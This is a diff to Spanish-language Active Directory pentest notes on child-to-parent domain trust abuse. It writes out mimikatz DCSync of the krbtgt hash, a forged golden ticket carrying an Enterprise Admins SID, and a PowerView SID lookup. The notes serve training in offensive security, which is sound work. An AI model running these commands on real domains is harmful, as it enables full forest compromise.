@@ -14,7 +14,9 @@
 - Debido a la ausencia de SID filtering, cuando este usuario autenticado con un SID modificado accede al dominio padre, est ratado como si fuera un miembro del grupo Admins, así dandole privilegios sobre todo el AD FOREST.
 
 ## Creación del golden ticket con mimikatz
-- `mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt`
+- [Golden Ticket Attack más info](./goldenTicketAttack.md)
+- `mimikatz # lsadump::dcsync /user:DOMAIN\krbtgt`
+- `kerberos::golden /user:hacker /domain:DOMAIN.LOCAL /sid:SID-FOR-THE-CHILD-DOMAIN /krbtgt:9d765b482771505cbe97411065964d5f /sids:ENTERPRISE-ADMIN-SID /ptt`
 
 ## Obtener SID de enterprise admin
-- `Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid`
+- `Get-DomainGroup -Domain DOMAIN.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid`
